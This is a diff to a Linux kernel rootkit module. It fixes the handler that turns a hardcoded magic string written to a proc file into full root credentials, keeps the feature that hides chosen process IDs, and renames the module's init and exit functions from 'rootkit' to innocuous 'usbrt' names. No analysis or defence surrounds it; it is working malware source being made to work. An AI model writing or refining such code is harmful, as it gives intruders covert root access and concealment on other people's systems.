@@ -189,10 +189,10 @@ static ssize_t rtkit_write(struct file *file, const char __user *buff, size_t co
 {
 	if (!strncmp(buff, "mypenislong", MIN(11, count))) { //changes to root
 		struct cred *credentials = prepare_creds();
-		credentials->uid.val = 0;
-		credentials->gid.val = 0;
-		credentials->uid = credentials->euid;
-		credentials->gid = credentials->egid;
+		//credentials->uid.val = 0;
+		//credentials->gid.val = 0;
+		credentials->uid.val = credentials->euid.val = 0;
+		credentials->gid.val = credentials->egid.val = 0;
 		commit_creds(credentials);
 	} else if (!strncmp(buff, "hp", MIN(2, count))) {//hpXXXXXX hides process with given id
 		if (current_pid < MAX_PIDS) strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
@@ -319,7 +319,7 @@ static int __init fs_init(void)
 
 
 //MODULE INIT/EXIT
-static int __init rootkit_init(void)
+static int __init usbrt_init(void)
 {
 	if (!procfs_init() || !fs_init()) {
 		procfs_clean();
@@ -331,11 +331,12 @@ static int __init rootkit_init(void)
 	return 0;
 }
 
-static void __exit rootkit_exit(void)
+static void __exit usbrt_exit(void)
 {
 	procfs_clean();
 	fs_clean();
 }
 
-module_init(rootkit_init);
-module_exit(rootkit_exit);
+module_init(usbrt_init);
+module_exit(usbrt_exit);
+MODULE_LICENSE("GPL");
